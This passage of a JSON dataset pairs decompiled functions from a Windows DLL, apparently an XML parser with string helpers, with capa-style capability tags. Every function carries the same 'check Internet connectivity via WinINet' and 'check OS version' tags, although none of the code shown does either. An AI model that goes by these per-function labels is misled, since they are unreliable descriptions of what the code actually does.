        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.1800130a0(uchar *arg1, uchar *arg2, uint *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iStack136;\n    uchar auStack128 [8];\n    int64_t iStack120;\n    uint32_t uStack112;\n    int32_t iStack108;\n    char *pcStack104;\n    char *pcStack96;\n    uchar *puStack88;\n    uchar *puStack80;\n    uchar *puStack72;\n    uchar *puStack64;\n    uchar *puStack56;\n    uchar *puStack48;\n    uchar *puStack40;\n    uchar *puStack32;\n    uchar *puStack24;\n    ulong uStack16;\n    \n    fcn.18000f8d0(auStack128);\n    *arg3 = 0;\n    if (((arg1[1] == '\\0') || (arg1[1] != '#')) || (arg1[2] == '\\0')) {\n        iStack136 = 0;\n        while( true ) {\n            if (4 < iStack136) {\n                *arg2 = *arg1;\n                puStack24 = arg1 + 1;\n                fcn.18000f8f0(auStack128);\n                return puStack24;\n            }\n            uStack16 = 0x180048890;\n            iVar1 = fcn.180024bf0(*(iStack136 * 0x10 + 0x180048890), arg1, *(iStack136 * 0x10 + 0x180048898));\n            if (iVar1 == 0) break;\n            iStack136 = iStack136 + 1;\n        }\n        *arg2 = *(iStack136 * 0x10 + 0x18004889c);\n        *arg3 = 1;\n        puStack32 = arg1 + *(iStack136 * 0x10 + 0x180048898);\n        fcn.18000f8f0(auStack128);\n        return puStack32;\n    }\n    uStack112 = 0;\n    iStack120 = 0;\n    iStack108 = 1;\n    if (arg1[2] == 'x') {\n        if (arg1[3] == '\\0') {\n            puStack88 = NULL;\n            fcn.18000f8f0(auStack128);\n            return puStack88;\n        }\n        pcStack104 = arg1 + 3;\n        pcStack104 = fcn.180024ca8(pcStack104);\n        if ((pcStack104 == NULL) || (*pcStack104 == '\\0')) {\n            puStack80 = NULL;\n            fcn.18000f8f0(auStack128);\n            return puStack80;\n        }\n        iStack120 = pcStack104 - arg1;\n        while (pcStack104 = pcStack104 + -1,  *pcStack104 != 'x') {\n            if ((*pcStack104 < '0') || ('9' < *pcStack104)) {\n                if ((*pcStack104 < 'a') || ('f' < *pcStack104)) {\n                    if ((*pcStack104 < 'A') || ('F' < *pcStack104)) {\n                        puStack72 = NULL;\n                        fcn.18000f8f0(auStack128);\n                        return puStack72;\n                    }\n                    uStack112 = uStack112 + iStack108 * (*pcStack104 + -0x37);\n                }\n                else {\n                    uStack112 = uStack112 + iStack108 * (*pcStack104 + -0x57);\n                }\n            }\n            else {\n                uStack112 = uStack112 + iStack108 * (*pcStack104 + -0x30);\n            }\n            iStack108 = iStack108 * 0x10;\n        }\n    }\n    else {\n        if (arg1[2] == '\\0') {\n            puStack64 = NULL;\n            fcn.18000f8f0(auStack128);\n            return puStack64;\n        }\n        pcStack96 = arg1 + 2;\n        pcStack96 = fcn.180024ca8(pcStack96);\n        if ((pcStack96 == NULL) || (*pcStack96 == '\\0')) {\n            puStack56 = NULL;\n            fcn.18000f8f0(auStack128);\n            return puStack56;\n        }\n        iStack120 = pcStack96 - arg1;\n        while (pcStack96 = pcStack96 + -1,  *pcStack96 != '#') {\n            if ((*pcStack96 < '0') || ('9' < *pcStack96)) {\n                puStack48 = NULL;\n                fcn.18000f8f0(auStack128);\n                return puStack48;\n            }\n            uStack112 = uStack112 + iStack108 * (*pcStack96 + -0x30);\n            iStack108 = iStack108 * 10;\n        }\n    }\n    if (arg4 == 1) {\n        fcn.1800128a0(uStack112, arg2, arg3);\n    }\n    else {\n        *arg2 = uStack112;\n        *arg3 = 1;\n    }\n    puStack40 = arg1 + iStack120 + 1;\n    fcn.18000f8f0(auStack128);\n    return puStack40;\n}\n",
        "token_count": 1184
    },
    "1800135b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.1800135b0(char *arg1, char *arg2, ulong noname_2, ulong arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    char *pcStackX16;\n    char *pcStack24;\n    \n    if ((arg1 == NULL) || (in_RAX = *arg1,  *arg1 == 0)) {\n        uVar4 = in_RAX & 0xffffffffffffff00;\n    }\n    else {\n        pcStackX16 = arg2;\n        pcStack24 = arg1;\n        if (noname_2 == '\\0') {\n            for (; ((*pcStack24 != '\\0' && (*pcStackX16 != '\\0')) && (*pcStack24 == *pcStackX16));\n                pcStack24 = pcStack24 + 1) {\n                pcStackX16 = pcStackX16 + 1;\n            }\n            uVar3 = *pcStackX16;\n            if (uVar3 == 0) {\n                return CONCAT71(*pcStackX16 >> 7, 1);\n            }\n        }\n        else {\n            for (; (*pcStack24 != '\\0' && (*pcStackX16 != '\\0')); pcStackX16 = pcStackX16 + 1) {\n                iVar1 = fcn.1800127f0(*pcStack24, arg4);\n                iVar2 = fcn.1800127f0(*pcStackX16, arg4);\n                if (iVar1 != iVar2) break;\n                pcStack24 = pcStack24 + 1;\n            }\n            uVar3 = *pcStackX16;\n            if (uVar3 == 0) {\n                return CONCAT71(*pcStackX16 >> 7, 1);\n            }\n        }\n        uVar4 = (uVar3 >> 8) << 8;\n    }\n    return uVar4;\n}\n",
        "token_count": 439
    },
    "1800136d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.1800136d0(char *arg1, ulong arg2, ulong noname_2, char *arg4)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    char *pcStackX8;\n    uint8_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    int32_t iStack40;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    char cStack32;\n    int32_t iStack28;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    char *pcStack16;\n    \n    fcn.18000fe20(arg2, 0x1800387a3);\n    pcStackX8 = arg1;\n    if ((noname_2 == '\\0') || (*0x180048848 == '\\0')) {\n        while ((pcStackX8 != NULL &&\n               ((*pcStackX8 != '\\0' &&\n                (cVar1 = fcn.1800135b0(pcStackX8, arg4, in_stack_00000028, in_stack_00000030),  cVar1 == '\\0'))))) {\n            uStack36 = 0;\n            uStack35 = 0;\n            uStack34 = 0;\n            uStack33 = 0;\n            pcStackX8 = fcn.1800126e0(pcStackX8, &uStack36, &iStack40, in_stack_00000030);\n            fcn.18000fd10(arg2, &uStack36, iStack40);\n        }\n    }\n    else {\n        cStack32 = '\\0';\n        pcStackX8 = fcn.180012df0(arg1, in_stack_00000030);\n        while (((pcStackX8 != NULL && (*pcStackX8 != '\\0')) &&\n               (cVar1 = fcn.1800135b0(pcStackX8, arg4, in_stack_00000028, in_stack_00000030),  cVar1 == '\\0'))) {\n            if ((*pcStackX8 == '\\r') || (*pcStackX8 == '\\n')) {\n                cStack32 = '\\x01';\n                pcStackX8 = pcStackX8 + 1;\n            }\n            else {\n                cVar1 = fcn.180012690(*pcStackX8);\n                if (cVar1 == '\\0') {\n                    if (cStack32 != '\\0') {\n                        fcn.18000fef0(arg2);\n                        cStack32 = '\\0';\n                    }\n                    uStack24 = 0;\n                    uStack23 = 0;\n                    uStack22 = 0;\n                    uStack21 = 0;\n                    pcStackX8 = fcn.1800126e0(pcStackX8, &uStack24, &iStack28, in_stack_00000030);\n                    if (iStack28 == 1) {\n                        fcn.18000fef0(arg2);\n                    }\n                    else {\n                        fcn.18000fd10(arg2, &uStack24, iStack28);\n                    }\n                }\n                else {\n                    cStack32 = '\\x01';\n                    pcStackX8 = pcStackX8 + 1;\n                }\n            }\n        }\n    }\n    if ((pcStackX8 != NULL) && (*pcStackX8 != '\\0')) {\n        uVar2 = 0xffffffffffffffff;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *arg4;\n            arg4 = arg4 + 1;\n        } while (cVar1 != '\\0');\n        pcStackX8 = pcStackX8 + (~uVar2 - 1);\n    }\n    if ((pcStackX8 == NULL) || (*pcStackX8 == '\\0')) {\n        pcStack16 = NULL;\n    }\n    else {\n        pcStack16 = pcStackX8;\n    }\n    return pcStack16;\n}\n",
        "token_count": 888
    },
    "18001394": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.180013940(int64_t arg1, char *arg2, uint *arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    ulong arg1_00;\n    int64_t iVar4;\n    uchar *puVar5;\n    ulong noname_2;\n    char *pcStackX16;\n    uint32_t uStackX32;\n    uchar auStack72 [24];\n    char *pcStack48;\n    int64_t *piStack40;\n    ulong uStack32;\n    char *pcStack24;\n    \n    fcn.1800107f0(arg1);\n    if ((arg2 == NULL) || (*arg2 == '\\0')) {\n        fcn.180013d00(arg1, 0xc, 0, 0);\n        pcStackX16 = NULL;\n    }\n    else {\n        fcn.180010060(arg1 + 8);\n        if (arg3 == NULL) {\n            *(arg1 + 8) = 0;\n            *(arg1 + 0xc) = 0;\n        }\n        else {\n            *(arg1 + 8) = *arg3;\n            *(arg1 + 0xc) = arg3[1];\n        }\n        uVar2 = fcn.180012890(arg1);\n        fcn.180012ae0(auStack72, arg2, uVar2, *(arg1 + 8));\n        puVar3 = fcn.18000eb30(auStack72);\n        *(arg1 + 8) = *puVar3;\n        uStackX32 = arg4;\n        if (((((arg4 == 0) && (pcStack48 = arg2,  *arg2 != '\\0')) && (*arg2 == -0x11)) &&\n            ((arg2[1] != '\\0' && (arg2[1] == -0x45)))) && ((arg2[2] != '\\0' && (arg2[2] == -0x41)))) {\n            uStackX32 = 1;\n            *(arg1 + 0x6c) = 1;\n        }\n        pcStackX16 = fcn.180012df0(arg2, uStackX32);\n        if (pcStackX16 == NULL) {\n            fcn.180013d00(arg1, 0xc, 0, 0);\n            pcStackX16 = NULL;\n        }\n        else {\n            while (((pcStackX16 != NULL && (*pcStackX16 != '\\0')) &&\n                   (piStack40 = fcn.180013dc0(arg1, pcStackX16, uStackX32),  piStack40 != NULL))) {\n                puVar5 = auStack72;\n                arg1_00 = (**(*piStack40 + 0x10))(piStack40, pcStackX16);\n                fcn.180010df0(arg1, piStack40);\n                if ((uStackX32 == 0) && (iVar4 = (**(*piStack40 + 0x68))(piStack40),  iVar4 != 0)) {\n                    uStack32 = (**(*piStack40 + 0x68))(piStack40);\n                    pcStack24 = fcn.180012870(uStack32);\n                    if (*pcStack24 == '\\0') {\n                        uStackX32 = 1;\n                    }\n                    else {\n                        noname_2 = CONCAT71(puVar5 >> 8, 1);\n                        cVar1 = fcn.1800135b0(pcStack24, \"UTF-8\", noname_2, 0);\n                        if (cVar1 == '\\0') {\n                            cVar1 = fcn.1800135b0(pcStack24, \"UTF8\", CONCAT71(noname_2 >> 8, 1), 0);\n                            if (cVar1 == '\\0') {\n                                uStackX32 = 2;\n                            }\n                            else {\n                                uStackX32 = 1;\n                            }\n                        }\n                        else {\n                            uStackX32 = 1;\n                        }\n                    }\n                }\n                pcStackX16 = fcn.180012df0(arg1_00, uStackX32);\n            }\n            if (*(arg1 + 0x28) == 0) {\n                fcn.180013d00(arg1, 0xc, 0, 0);\n                pcStackX16 = NULL;\n            }\n        }\n    }\n    return pcStackX16;\n}\n",
        "token_count": 979
    },
    "180013d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180013d00(int64_t arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong *puVar1;\n    uint32_t in_stack_00000028;\n    \n    if (*(arg1 + 0x50) == '\\0') {\n        *(arg1 + 0x50) = 1;\n        *(arg1 + 0x54) = arg2;\n        fcn.18000fe20(arg1 + 0x58, *(*(arg1 + 0x54) * 8 + 0x1800488e0));\n        fcn.180010060(arg1 + 100);\n        if ((arg3 != 0) && (arg4 != 0)) {\n            fcn.180012b40(arg4, arg3, in_stack_00000028);\n            puVar1 = fcn.18000eb30(arg4);\n            *(arg1 + 100) = *puVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "180013dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180013dc0(ulong arg1, ulong arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iStack208;\n    int64_t iStack64;\n    int64_t iStack56;\n    int64_t iStack48;\n    int64_t iStack40;\n    int64_t iStack32;\n    int64_t iStack24;\n    \n    uVar5 = arg3;\n    pcVar3 = fcn.180012df0(arg2, arg3 & 0xffffffff);\n    if (((pcVar3 == NULL) || (*pcVar3 == '\\0')) || (*pcVar3 != '<')) {\n        iStack208 = 0;\n    }\n    else {\n        pcVar3 = fcn.180012df0(pcVar3, arg3 & 0xffffffff);\n        if ((pcVar3 == NULL) || (*pcVar3 == '\\0')) {\n            iStack208 = 0;\n        }\n        else {\n            cVar1 = fcn.1800135b0(pcVar3, 0x180038ac4, CONCAT71(uVar5 >> 8, 1), arg3 & 0xffffffff);\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.1800135b0(pcVar3, 0x180039788, 0, arg3 & 0xffffffff);\n                if (cVar1 == '\\0') {\n                    cVar1 = fcn.1800135b0(pcVar3, 0x180039790, 0, arg3 & 0xffffffff);\n                    if (cVar1 == '\\0') {\n                        cVar1 = fcn.1800135b0(pcVar3, 0x1800388d4, 0, arg3 & 0xffffffff);\n                        if (cVar1 == '\\0') {\n                            iVar2 = fcn.180012a80(pcVar3[1], arg3 & 0xffffffff);\n                            if ((iVar2 == 0) && (pcVar3[1] != '_')) {\n                                iVar4 = fcn.180023ef8(0x50);\n                                if (iVar4 == 0) {\n                                    iStack24 = 0;\n                                }\n                                else {\n                                    iStack24 = fcn.1800106f0(iVar4);\n                                }\n                                iStack208 = iStack24;\n                            }\n                            else {\n                                iVar4 = fcn.180023ef8(0x90);\n                                if (iVar4 == 0) {\n                                    iStack32 = 0;\n                                }\n                                else {\n                                    iStack32 = fcn.180011040(iVar4, 0x1800387a7);\n                                }\n                                iStack208 = iStack32;\n                            }\n                        }\n                        else {\n                            iVar4 = fcn.180023ef8(0x50);\n                            if (iVar4 == 0) {\n                                iStack40 = 0;\n                            }\n                            else {\n                                iStack40 = fcn.1800106f0(iVar4);\n                            }\n                            iStack208 = iStack40;\n                        }\n                    }\n                    else {\n                        iVar4 = fcn.180023ef8(0x58);\n                        if (iVar4 == 0) {\n                            iStack48 = 0;\n                        }\n                        else {\n                            iStack48 = fcn.1800104d0(iVar4, 0x1800387a6);\n                        }\n                        fcn.180012850(iStack48);\n                        iStack208 = iStack48;\n                    }\n                }\n                else {\n                    iVar4 = fcn.180023ef8(0x50);\n                    if (iVar4 == 0) {\n                        iStack56 = 0;\n                    }\n                    else {\n                        iStack56 = fcn.180010420(iVar4);\n                    }\n                    iStack208 = iStack56;\n                }\n            }\n            else {\n                iVar4 = fcn.180023ef8(0x68);\n                if (iVar4 == 0) {\n                    iStack64 = 0;\n                }\n                else {\n                    iStack64 = fcn.1800105a0(iVar4);\n                }\n                iStack208 = iStack64;\n            }\n            if (iStack208 != 0) {\n                *(iStack208 + 0x18) = arg1;\n            }\n        }\n    }\n    return iStack208;\n}\n",
        "token_count": 982
    },
    "180014a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.180014a30(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    int64_t arg1_00;\n    int64_t arg1_01;\n    int64_t *arg2_00;\n    char *pcStackX16;\n    int64_t *piStack32;\n    \n    arg1_00 = fcn.1800101e0(arg1);\n    pcStackX16 = fcn.180012df0(arg2, arg4);\n    do {\n        if ((pcStackX16 == NULL) || (*pcStackX16 == '\\0')) {\n            if ((pcStackX16 == NULL) && (arg1_00 != 0)) {\n                fcn.180013d00(arg1_00, 5, 0, 0);\n            }\n            return pcStackX16;\n        }\n        if (*pcStackX16 == '<') {\n            cVar1 = fcn.1800135b0(pcStackX16, 0x180038934, 0, arg4);\n            if (cVar1 != '\\0') {\n                return pcStackX16;\n            }\n            arg2_00 = fcn.180013dc0(arg1, pcStackX16, arg4);\n            if (arg2_00 == NULL) {\n                return NULL;\n            }\n            pcStackX16 = (**(*arg2_00 + 0x10))(arg2_00, pcStackX16);\n            fcn.180010df0(arg1, arg2_00);\n        }\n        else {\n            arg1_01 = fcn.180023ef8(0x58);\n            if (arg1_01 == 0) {\n                piStack32 = NULL;\n            }\n            else {\n                piStack32 = fcn.1800104d0(arg1_01, 0x1800387b6);\n            }\n            if (piStack32 == NULL) {\n                return NULL;\n            }\n            cVar1 = fcn.180012680();\n            if (cVar1 == '\\0') {\n                pcStackX16 = (**(*piStack32 + 0x10))(piStack32);\n            }\n            else {\n                pcStackX16 = (**(*piStack32 + 0x10))(piStack32);\n            }\n            cVar1 = fcn.180015ad0(piStack32);\n            if (cVar1 == '\\0') {\n                fcn.180010df0(arg1, piStack32);\n            }\n            else if (piStack32 != NULL) {\n                (***piStack32)(piStack32);\n            }\n        }\n        pcStackX16 = fcn.180012df0(pcStackX16, arg4);\n    } while( true );\n}\n",
        "token_count": 603
    },
    "18001509": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * fcn.180015090(int64_t arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *pcVar2;\n    ulong *puVar3;\n    char *arg1_00;\n    char *pcStackX16;\n    \n    pcVar2 = fcn.180012df0(arg2, arg4);\n    if ((pcVar2 == NULL) || (*pcVar2 == '\\0')) {\n        pcVar2 = NULL;\n    }\n    else {\n        if (arg3 != 0) {\n            fcn.180012b40(arg3, pcVar2, arg4);\n            puVar3 = fcn.18000eb30(arg3);\n            *(arg1 + 8) = *puVar3;\n        }\n        arg1_00 = fcn.180012f70(pcVar2, arg1 + 0x20, arg4);\n        if ((arg1_00 == NULL) || (*arg1_00 == '\\0')) {\n            if (*(arg1 + 0x18) != 0) {\n                fcn.180013d00(*(arg1 + 0x18), 6, pcVar2, arg3);\n            }\n            pcVar2 = NULL;\n        }\n        else {\n            pcVar2 = fcn.180012df0(arg1_00, arg4);\n            if (((pcVar2 == NULL) || (*pcVar2 == '\\0')) || (*pcVar2 != '=')) {\n                if (*(arg1 + 0x18) != 0) {\n                    fcn.180013d00(*(arg1 + 0x18), 6, pcVar2, arg3);\n                }\n                pcVar2 = NULL;\n            }\n            else {\n                pcStackX16 = fcn.180012df0(pcVar2 + 1, arg4);\n                if ((pcStackX16 == NULL) || (*pcStackX16 == '\\0')) {\n                    if (*(arg1 + 0x18) != 0) {\n                        fcn.180013d00(*(arg1 + 0x18), 6, pcStackX16, arg3);\n                    }\n                    pcVar2 = NULL;\n                }\n                else if (*pcStackX16 == '\\'') {\n                    pcVar2 = fcn.1800136d0(pcStackX16 + 1, arg1 + 0x28, 0, 0x180038964);\n                }\n                else if (*pcStackX16 == '\\\"') {\n                    pcVar2 = fcn.1800136d0(pcStackX16 + 1, arg1 + 0x28, 0, 0x180038984);\n                }\n                else {\n                    fcn.18000fe20(arg1 + 0x28, 0x1800387e7);\n                    while( true ) {\n                        if (pcStackX16 == NULL) {\n                            return NULL;\n                        }\n                        if (*pcStackX16 == '\\0') {\n                            return pcStackX16;\n                        }\n                        cVar1 = fcn.180012690(*pcStackX16);\n                        if (cVar1 != '\\0') {\n                            return pcStackX16;\n                        }\n                        if (*pcStackX16 == '/') {\n                            return pcStackX16;\n                        }\n                        if (*pcStackX16 == '>') {\n                            return pcStackX16;\n                        }\n                        if ((*pcStackX16 == '\\'') || (*pcStackX16 == '\\\"')) break;\n                        fcn.18000fef0(arg1 + 0x28);\n                        pcStackX16 = pcStackX16 + 1;\n                    }\n                    if (*(arg1 + 0x18) != 0) {\n                        fcn.180013d00(*(arg1 + 0x18), 6, pcStackX16, arg3);\n                    }\n                    pcVar2 = NULL;\n                }\n            }\n        }\n    }\n    return pcVar2;\n}\n",
        "token_count": 859
    },
    "180015b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180015b40(int64_t arg1)\n\n{\n    ulong arg1_00;\n    \n    if (arg1 == 0) {\n        arg1_00 = 0;\n    }\n    else {\n        arg1_00 = fcn.180024064(arg1);\n        fcn.1800011f0(arg1_00, arg1);\n    }\n    return arg1_00;\n}\n",
        "token_count": 90
    },
    "180015b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180015b80(int64_t *arg1)\n\n{\n    if ((arg1 != NULL) && (*arg1 != 0)) {\n        fcn.180024024(*arg1);\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "180015c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180015c30(ulong arg1, int64_t *arg2)\n\n{\n    int64_t arg1_00;\n    ulong uVar1;\n    int32_t aiStack24 [2];\n    int64_t aiStack16 [2];\n    \n    arg1_00 = fcn.1800033a0(arg1);\n    aiStack24[0] = 0;\n    uVar1 = fcn.1800238c8(arg1_00, aiStack16, 0, aiStack24);\n    if (arg1_00 == aiStack16[0]) {\n        fcn.180023760(\"invalid stod argument\");\n    }\n    if (aiStack24[0] != 0) {\n        fcn.180023818(\"stod argument out of range\");\n    }\n    if (arg2 != NULL) {\n        *arg2 = aiStack16[0] - arg1_00;\n    }\n    return uVar1;\n}\n",
        "token_count": 211
    },
    "180015e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180015e80(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iStack24;\n    \n    iStack24 = fcn.1800160c0(arg1, arg2, 0x7fffffff);\n    if (-1 < iStack24) {\n        iStack24 = fcn.180016170(arg1, arg2, 0, arg3);\n    }\n    return iStack24;\n}\n",
        "token_count": 101
    },
    "180015ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180015ef0(int64_t arg1, uint64_t arg2, ulong arg3)\n\n{\n    int32_t iStack40;\n    int64_t aiStack24 [3];\n    \n    iStack40 = fcn.180016100(arg1, arg2 / 2, aiStack24, 0x7fffffff);\n    if (-1 < iStack40) {\n        iStack40 = fcn.180001610(arg1 + aiStack24[0] * 2, arg2 / 2 - aiStack24[0], 0, arg3);\n    }\n    return iStack40;\n}\n",
        "token_count": 138
    },
    "180015f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180015f80(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iStack40;\n    \n    iStack40 = fcn.1800160c0(arg1, arg2 / 2, 0x7fffffff);\n    if (-1 < iStack40) {\n        iStack40 = fcn.180016260(arg1, arg2 / 2, 0, arg3);\n    }\n    return iStack40;\n}\n",
        "token_count": 113
    },
    "18001601": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180016010(int16_t *arg1, int64_t arg2, int64_t *arg3)\n\n{\n    int16_t *piStackX8;\n    int64_t iStackX16;\n    int32_t iStack16;\n    \n    iStack16 = 0;\n    iStackX16 = arg2;\n    for (piStackX8 = arg1; (iStackX16 != 0 && (*piStackX8 != 0)); piStackX8 = piStackX8 + 1) {\n        iStackX16 = iStackX16 + -1;\n    }\n    if (iStackX16 == 0) {\n        iStack16 = -0x7ff8ffa9;\n    }\n    if (arg3 != NULL) {\n        if (iStack16 < 0) {\n            *arg3 = 0;\n        }\n        else {\n            *arg3 = arg2 - iStackX16;\n        }\n    }\n    return iStack16;\n}\n",
        "token_count": 220
    },
    "1800160c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.1800160c0(ulong arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint uStack24;\n    \n    uStack24 = 0;\n    if ((arg2 == 0) || (arg3 < arg2)) {\n        uStack24 = 0x80070057;\n    }\n    return uStack24;\n}\n",
        "token_count": 82
    },
    "18001610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180016100(ulong arg1, ulong arg2, ulong *arg3, ulong arg4)\n\n{\n    int32_t iStack24;\n    \n    iStack24 = fcn.1800160c0(arg1, arg2, arg4);\n    if (iStack24 < 0) {\n        *arg3 = 0;\n    }\n    else {\n        iStack24 = fcn.180016010(arg1, arg2, arg3);\n    }\n    return iStack24;\n}\n",
        "token_count": 113
    },
    "18001617": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180016170(char *arg1, int64_t arg2, int64_t *arg3, char *arg4)\n\n{\n    char *pcStackX8;\n    int64_t iStackX16;\n    char *pcStackX32;\n    int64_t in_stack_00000028;\n    int64_t iStack24;\n    uint uStack16;\n    \n    uStack16 = 0;\n    iStack24 = 0;\n    pcStackX8 = arg1;\n    iStackX16 = arg2;\n    for (pcStackX32 = arg4; ((iStackX16 != 0 && (in_stack_00000028 != 0)) && (*pcStackX32 != '\\0'));\n        pcStackX32 = pcStackX32 + 1) {\n        *pcStackX8 = *pcStackX32;\n        pcStackX8 = pcStackX8 + 1;\n        iStackX16 = iStackX16 + -1;\n        in_stack_00000028 = in_stack_00000028 + -1;\n        iStack24 = iStack24 + 1;\n    }\n    if (iStackX16 == 0) {\n        pcStackX8 = pcStackX8 + -1;\n        iStack24 = iStack24 + -1;\n        uStack16 = 0x8007007a;\n    }\n    *pcStackX8 = '\\0';\n    if (arg3 != NULL) {\n        *arg3 = iStack24;\n    }\n    return uStack16;\n}\n",
        "token_count": 336
    },
    "18001626": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
